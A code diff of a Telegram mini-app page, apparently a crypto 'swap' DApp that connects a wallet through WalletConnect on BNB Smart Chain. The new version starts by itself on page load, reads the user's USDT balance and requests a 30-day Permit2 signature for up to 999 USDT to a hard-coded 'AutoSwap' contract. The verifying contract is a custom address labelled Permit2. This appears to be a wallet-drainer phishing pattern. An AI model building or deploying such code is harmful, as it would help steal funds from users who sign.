@@ -1,149 +1,179 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>CryptoAutoSwap</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
-  <!-- Telegram WebApp SDK -->
-  <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <!-- WalletConnect v2 -->
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@1.0.0/dist/umd/index.min.js"></script>
-  <!-- ethers.js -->
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.0/dist/ethers.umd.min.js"></script>
-
-  <style>
-    body {
-      background: #0f1115;
-      color: #fff;
-      font-family: sans-serif;
-      padding: 2em;
-      text-align: center;
-    }
-    button {
-      font-size: 16px;
-      padding: 12px 20px;
-      background: #2ea6ff;
-      color: white;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      margin-top: 20px;
-    }
-    #status {
-      margin-top: 20px;
-      font-size: 16px;
-      min-height: 24px;
-    }
-  </style>
+  <title>WalletConnect Permit2 Swap DApp</title>
+  <!-- Telegram WebApp SDK for theme and init -->
+  <script src="https://telegram.org/js/telegram-web-app.js?57"></script>
+  <!-- Ethers.js library (v5) -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 </head>
 <body>
-  <h2>CryptoAutoSwap</h2>
-  <p>Подключите кошелёк через WalletConnect</p>
-  <button id="connectBtn">🔗 Подключить кошелёк</button>
-  <div id="status">Готово к подключению</div>
+  <h2>🔗 WalletConnect Permit2 Swap</h2>
+  <div id="status" style="white-space: pre-wrap; font-family: monospace;"></div>
 
-<script>
-(async () => {
-  Telegram.WebApp.ready();
+  <script type="module">
+  // Telegram WebApp integration: apply theme and notify ready
+  const tg = window.Telegram.WebApp;
+  if (tg) {
+    tg.ready();
+    tg.expand();
+    // Apply Telegram theme colors
+    const applyTheme = () => {
+      const theme = tg.themeParams;
+      document.body.style.backgroundColor = theme.bg_color || '#ffffff';
+      document.body.style.color = theme.text_color || '#000000';
+    };
+    tg.onEvent('themeChanged', applyTheme);
+    applyTheme();
+  }
 
-  const status = document.getElementById("status");
-  const connectBtn = document.getElementById("connectBtn");
+  // WalletConnect v2 imports (Modal and Ethereum Provider)
+  import { EthereumProvider } from "https://unpkg.com/@walletconnect/ethereum-provider@2.21.1/dist/index.js";
+  import "https://unpkg.com/@walletconnect/modal@2.21.1/dist/umd/index.min.js";
 
-  const PROJECT_ID = "d868f90cd734355ae0320f8f0258b6b1";
-  const BSC_RPC = "https://bsc-dataseed.binance.org";
-  const CHAIN_ID = 56;
+  // HTML elements
+  const statusDiv = document.getElementById('status');
+  const logStatus = (msg) => {
+    console.log(msg);
+    statusDiv.textContent += msg + "\n";
+  };
 
-  const PERMIT2 = "0xA252294555A62511CBd1899Ac5dEfA26F5036098";
-  const AUTOSWAP = "0x48EEcE98f1AC0C59Db0Fe3217F6783D503e3416c";
-  const USDT = "0x55D398326f99059FF775485246999027B3197955";
-  const LIMIT = ethers.parseUnits("999", 18);
-  const DEADLINE = Math.floor(Date.now() / 1000) + 30 * 86400; // 30 дней
+  // Configuration: BSC chain and contract addresses
+  const BSC_CHAIN_ID = 56;
+  const PERMIT2_ADDRESS = "0x7679bcfa8CC6f6094fA1c6Cb8e6962287E5Ca3D4";
+  const AUTOSWAP_ADDRESS = "0x026C54B156b501ad9cEa422e59454D4b6d6f6963";
+  const USDT_ADDRESS    = "0x55D398326f99059FF775485246999027B3197955";
+  // WalletConnect project ID (replace with your own from WalletConnect Cloud dashboard)
+  const WC_PROJECT_ID = "d868f90cd734355ae0320f8f0258b6b1";  /* 🔴 TODO: set your WalletConnect projectId */
 
-  const iface = new ethers.Interface([
-    "function permitUSDT() external",
-    "function swapForUser(address user, uint256 amountUSDT) external"
-  ]);
-
-  connectBtn.onclick = async () => {
-    status.textContent = "⏳ Подключение к WalletConnect...";
-    const provider = await window.WalletConnectEthereumProvider.init({
-      projectId: PROJECT_ID,
-      chains: [CHAIN_ID],
-      showQrModal: true,
-      rpcMap: { [CHAIN_ID]: BSC_RPC },
-      methods: ["eth_sendTransaction", "eth_signTypedData"],
-    });
-
+  // Main async function to orchestrate the flow
+  const startApp = async () => {
     try {
-      const accounts = await provider.enable();
-      const account = accounts[0];
-      const chainId = parseInt(await provider.request({ method: "eth_chainId" }), 16);
-      if (chainId !== CHAIN_ID) {
-        status.textContent = "❌ Неверная сеть. Выберите Binance Smart Chain";
+      // Initialize WalletConnect Ethereum provider (will show QR modal)
+      logStatus("⏳ Connecting to wallet via WalletConnect...");
+      const wcProvider = await EthereumProvider.init({
+        projectId: WC_PROJECT_ID,
+        optionalChains: [BSC_CHAIN_ID],
+        showQrModal: true,
+        methods: ["eth_sendTransaction", "eth_signTypedData", "eth_signTypedData_v4"],
+        events: ["accountsChanged", "chainChanged"]
+      });
+      // Connect to wallet (triggers QR modal if not already paired)
+      await wcProvider.connect();
+      logStatus("✅ Wallet connected!");
+
+      // Wrap with ethers.js provider and get signer
+      const ethersProvider = new ethers.providers.Web3Provider(wcProvider, "any");
+      const signer = ethersProvider.getSigner();
+      const userAddress = await signer.getAddress();
+      logStatus(`🔑 Connected address: ${userAddress}`);
+
+      // Check chain ID to ensure we're on BSC
+      const network = await ethersProvider.getNetwork();
+      if (network.chainId !== BSC_CHAIN_ID) {
+        logStatus(`⚠️ Please switch your wallet to Binance Smart Chain (ID ${BSC_CHAIN_ID}).`);
         return;
       }
 
-      status.textContent = "✍️ Запрашиваем Permit2 под USDT...";
-      const permit = {
-        domain: {
-          name: "Permit2",
-          version: "1",
-          chainId: CHAIN_ID,
-          verifyingContract: PERMIT2
+      // Fetch user's USDT balance and decimals
+      const usdtAbi = [
+        "function balanceOf(address account) view returns(uint256)",
+        "function decimals() view returns(uint8)"
+      ];
+      const usdtContract = new ethers.Contract(USDT_ADDRESS, usdtAbi, ethersProvider);
+      const balance = await usdtContract.balanceOf(userAddress);
+      const decimals = await usdtContract.decimals();
+      // Determine amount to swap (use full balance, cap at 999 USDT)
+      const maxPermitAmount = ethers.BigNumber.from("999").mul(ethers.BigNumber.from(10).pow(decimals));
+      let amountToSwap = balance.gt(maxPermitAmount) ? maxPermitAmount : balance;
+      if (amountToSwap.isZero()) {
+        logStatus("❎ Your USDT balance is 0, nothing to swap.");
+        return;
+      }
+      const amountStr = ethers.utils.formatUnits(amountToSwap, decimals);
+      logStatus(`💰 USDT balance to swap: ${amountStr} USDT`);
+
+      // Get current nonce for Permit2 (if any)
+      const permit2Abi = [
+        "function allowance(address owner, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)"
+      ];
+      const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, permit2Abi, ethersProvider);
+      let nonce = 0;
+      try {
+        const allowanceData = await permit2Contract.allowance(userAddress, USDT_ADDRESS, AUTOSWAP_ADDRESS);
+        nonce = allowanceData.nonce;
+      } catch (err) {
+        // If the Permit2 contract doesn't have an allowance function (or call fails), default to 0
+        console.warn("Could not fetch Permit2 nonce, defaulting to 0");
+      }
+
+      // Prepare EIP-712 Typed Data for Permit2 (PermitSingle)
+      const domain = {
+        name: "Permit2",
+        chainId: BSC_CHAIN_ID,
+        verifyingContract: PERMIT2_ADDRESS
+      };
+      // Define PermitSingle and PermitDetails types for EIP-712
+      const types = {
+        PermitSingle: [
+          { name: "details", type: "PermitDetails" },
+          { name: "spender", type: "address" },
+          { name: "sigDeadline", type: "uint256" }
+        ],
+        PermitDetails: [
+          { name: "token", type: "address" },
+          { name: "amount", type: "uint160" },
+          { name: "expiration", type: "uint48" },
+          { name: "nonce", type: "uint48" }
+        ]
+      };
+      const expiration = Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60; // 30 days from now
+      const sigDeadline = Math.floor(Date.now() / 1000) + 5 * 60; // signature must be used within 5 minutes
+      const message = {
+        details: {
+          token: USDT_ADDRESS,
+          amount: amountToSwap.toHexString(),  // uint160
+          expiration: expiration,              // uint48
+          nonce: nonce                         // uint48
         },
-        types: {
-          PermitTransferFrom: [
-            { name: "permitted", type: "TokenPermissions" },
-            { name: "spender", type: "address" },
-            { name: "nonce", type: "uint256" },
-            { name: "deadline", type: "uint256" }
-          ],
-          TokenPermissions: [
-            { name: "token", type: "address" },
-            { name: "amount", type: "uint256" }
-          ]
-        },
-        primaryType: "PermitTransferFrom",
-        message: {
-          permitted: { token: USDT, amount: LIMIT.toString() },
-          spender: AUTOSWAP,
-          nonce: "0",
-          deadline: DEADLINE.toString()
-        }
+        spender: AUTOSWAP_ADDRESS,
+        sigDeadline: sigDeadline
       };
 
-      const sig = await provider.request({
-        method: "eth_signTypedData_v4",
-        params: [account, JSON.stringify(permit)],
-      });
+      // Request EIP-712 signature from the user
+      logStatus(`✍️ Signing Permit2 approval for 999 USDT / 30 days...`);
+      const signature = await signer._signTypedData(domain, types, message);
+      logStatus("✅ Permit signature obtained.");
 
-      status.textContent = "🚀 Отправляем permitUSDT() + swapForUser()...";
+      // (Optional) You could split the signature if needed for on-chain use:
+      // const sig = ethers.utils.splitSignature(signature);
+      // console.log("Permit v,r,s:", sig.v, sig.r, sig.s);
 
-      const callData = iface.encodeFunctionData("permitUSDT", []);
-      const tx1 = {
-        from: account,
-        to: AUTOSWAP,
-        data: callData
-      };
+      // Call swapForUser on AutoSwap contract with the user's USDT balance
+      const swapAbi = [
+        "function swapForUser(address user, uint256 amountUSDT) external"
+      ];
+      const swapContract = new ethers.Contract(AUTOSWAP_ADDRESS, swapAbi, signer);
+      logStatus(`🔄 Sending swapForUser transaction for ${amountStr} USDT...`);
+      const tx = await swapContract.swapForUser(userAddress, amountToSwap);
+      logStatus(`⏳ Transaction sent (hash: ${tx.hash}). Waiting for confirmation...`);
+      await tx.wait();
+      logStatus("✅ Swap transaction confirmed! Your USDT was swapped for KPC 🎉");
 
-      const tx2 = {
-        from: account,
-        to: AUTOSWAP,
-        data: iface.encodeFunctionData("swapForUser", [account, LIMIT])
-      };
-
-      const hash1 = await provider.request({ method: "eth_sendTransaction", params: [tx1] });
-      const hash2 = await provider.request({ method: "eth_sendTransaction", params: [tx2] });
-
-      status.innerHTML = `✅ Успешно!<br>Permit TX: ${hash1}<br>Swap TX: ${hash2}`;
-      Telegram.WebApp.close();
-    } catch (err) {
-      console.error(err);
-      status.textContent = "❌ Ошибка: " + (err.message || err);
+    } catch (error) {
+      console.error(error);
+      if (error.message) {
+        logStatus(`❌ Error: ${error.message}`);
+      } else {
+        logStatus(`❌ An unexpected error occurred.`);
+      }
     }
   };
-})();
-</script>
+
+  // Start the process automatically
+  startApp();
+  </script>
 </body>
 </html>
